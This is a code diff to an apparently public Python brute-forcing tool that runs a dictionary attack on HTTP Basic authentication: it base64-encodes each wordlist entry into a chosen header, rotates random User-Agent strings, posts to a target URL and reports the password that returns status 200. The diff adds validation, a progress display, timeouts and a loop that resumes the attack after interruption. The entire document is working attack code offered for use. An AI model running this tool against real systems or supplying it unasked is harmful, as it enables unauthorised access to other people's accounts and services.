@@ -1,3 +1,5 @@
+import os
+import sys
 import requests
 import base64
 import argparse
@@ -6,6 +8,12 @@ import random
 from tqdm import tqdm
 from termcolor import colored
 from tabulate import tabulate
+
+import validators
+from requests.exceptions import RequestException, Timeout, ConnectionError
+from rich.console import Console
+from rich.table import Table
+from rich.progress import Progress
 
 def print_banner():
     banner = """
@@ -16,11 +24,24 @@ def print_banner():
     ██████╔╝███████╗██║     ╚██████╔╝███████║███████╗
     ╚═════╝ ╚══════╝╚═╝      ╚═════╝ ╚══════╝╚══════╝
 
-    Author:hxlxmjxbbxs
+    Author: hxlxmjxbbxs
     Github: https://github.com/hxlxmjxbbxs
     Released: 2023/06/07
     """
     print(banner)
+
+def validate_input(args):
+    if not args.url or not validators.url(args.url):
+        raise ValueError("Invalid URL provided.")
+
+    if not args.header:
+        raise ValueError("Header not provided.")
+
+    if not args.wordlist or not os.path.isfile(args.wordlist):
+        raise ValueError("Invalid wordlist file provided.")
+
+    if not args.user_agents or not os.path.isfile(args.user_agents):
+        raise ValueError("Invalid user agents file provided.")
 
 def load_user_agents(user_agents_file):
     with open(user_agents_file, 'r') as f:
@@ -28,59 +49,84 @@ def load_user_agents(user_agents_file):
 
 def encode_wordlist(wordlist):
     with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
-        words = f.read().splitlines()
-    return [(word, base64.b64encode(word.encode()).decode()) for word in words]
+        for line in f:
+            yield (line.strip(), base64.b64encode(line.strip().encode()).decode())
+
+def format_time(seconds):
+    seconds = int(seconds)
+    minutes, seconds = divmod(seconds, 60)
+    hours, minutes = divmod(minutes, 60)
+    return f"{hours:02d}:{minutes:02d}:{seconds:02d}"
+
+def load_wordlist(wordlist):
+    with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
+        lines = f.readlines()
+    return [line.strip() for line in lines]
 
 def dictionary_attack(url, header, wordlist, user_agents):
+    user_agents = load_user_agents(user_agents)
+    headers = {'User-Agent': '', header: ''}
+    wordlist_words = load_wordlist(wordlist)
+    wordlist_length = len(wordlist_words)
 
-    original_url = url
-    original_header = header
-    original_wordlist = wordlist
-    original_user_agents = user_agents
+    start_time = time.time()
+    progress_width = 40  # Width of the progress bar
 
-    try:
-        encoded_words = encode_wordlist(wordlist)
-        user_agents = load_user_agents(user_agents)
-        start_time = time.time()
+    console = Console()
+    progress = Progress(console=console, auto_refresh=False)
+    table = Table(show_header=True, header_style="bold magenta")
+    table.add_column("Current password", justify="left")
+    table.add_column("Estimated remaining time", justify="left")
+    table.add_column("Status code", justify="left")
+    table.add_column("Content length", justify="left")
 
-        table = []
-        for i, (word, encoded_word) in enumerate(tqdm(encoded_words, ncols=70)):
-            headers = {
-                header: 'Basic ' + encoded_word,
-                'User-Agent': random.choice(user_agents)
-            }
-            response = requests.post(url, headers=headers)
-            elapsed_time = time.time() - start_time
-            remaining_time = elapsed_time / (i+1) * (len(encoded_words) - i - 1)
-            status_code = response.status_code if response.status_code == 200 else colored(response.status_code, 'red')
+    with progress:
+        task = progress.add_task("[cyan]Attacking...", total=wordlist_length)
 
-            table = [
-                     ["Current password", word + " / " + encoded_word],
-                     ["Estimated remaining time", f"{remaining_time:.2f} seconds"],
-                     ["Status code", status_code],
-                     ["Content length", len(response.content)]
-                    ]
+        for i, word in enumerate(wordlist_words, 1):
+            encoded_word = base64.b64encode(word.encode()).decode()
 
-            print("\033c", end="") 
-            print_banner()
-            print("\n" + tabulate(table, tablefmt="grid") + "\n" + "\n", end="\r") 
+            headers['User-Agent'] = random.choice(user_agents)
+            headers[header] = 'Basic ' + encoded_word
 
-            if response.status_code == 200:
-                print(f"\nSuccess with : {word}")
-                return
+            try:
+                response = requests.post(url, headers=headers, timeout=5)
+                elapsed_time = time.time() - start_time
+                remaining_time = elapsed_time / i * (wordlist_length - i)
+                status_code = response.status_code if response.status_code == 200 else colored(str(response.status_code), 'red')
 
-    except KeyboardInterrupt:
-        confirmation = input("\nAre you sure you want to exit? Y/n ")
-        if confirmation.lower() == 'n':
-            print("Canceling the exit. Resuming the attack...")
+                if i % 10 == 0:
+                    progress.update(task, completed=i)
+                    percentage = f'{i} / {wordlist_length}'
+                    estimated_time = format_time(remaining_time)
+                    
+                    table = Table(show_header=True, header_style="bold magenta")
+                    table.add_column("Current password", justify="left")
+                    table.add_column("Estimated remaining time", justify="left")
+                    table.add_column("Status code", justify="left")
+                    table.add_column("Content length", justify="left")
+                    table.add_row(word + " / " + encoded_word, estimated_time, status_code, str(len(response.content)))
+                    console.clear()
+                    print_banner()
+                    console.print(table)
+                    console.print(f"Progress: {progress_bar(i, wordlist_length)} {percentage} - Estimated remaining time: {estimated_time}")
 
-            dictionary_attack(original_url, original_header, original_wordlist, original_user_agents)
-        else:
-            print("Exiting the program.")
-            exit(0)
+                if response.status_code == 200:
+                    progress.stop()
+                    console.print(f"\nSuccess with: {word}")
+                    return
 
-    print("\nAttack finished, no successful attempts")
+            except (RequestException, Timeout, ConnectionError):
+                pass
 
+        progress.stop()
+        console.print("\nAttack finished, no successful attempts")
+
+def progress_bar(completed, total):
+    bar_length = 40
+    filled_length = int(round(bar_length * completed / total))
+    bar = "█" * filled_length + " " * (bar_length - filled_length)
+    return f"[{bar}]"
 
 if __name__ == "__main__":
     print_banner()
@@ -94,13 +140,19 @@ if __name__ == "__main__":
     args = parser.parse_args()
 
     try:
-        dictionary_attack(args.url, args.header, args.wordlist, args.user_agents)
-    except KeyboardInterrupt:
-        confirmation = input("\nAre you sure you want to exit? Y/n ")
-        if confirmation.lower() == 'n':
-            print("Canceling the exit. Resuming the attack...")
-            dictionary_attack(args.url, args.header, args.wordlist, args.user_agents)
-        else:
-            print("Exiting the program.")
-            exit(0)
+        validate_input(args)
+    except ValueError as e:
+        print(f"Error: {str(e)}")
+        sys.exit(1)
 
+    while True:
+        try:
+            dictionary_attack(args.url, args.header, args.wordlist, args.user_agents)
+        except KeyboardInterrupt:
+            confirmation = input("\nAre you sure you want to exit? Y/n ")
+            if confirmation.lower() != 'n':
+                print("Exiting the program.")
+                sys.exit(0)
+            print("Canceling the exit. Resuming the attack...")
+        else:
+            break
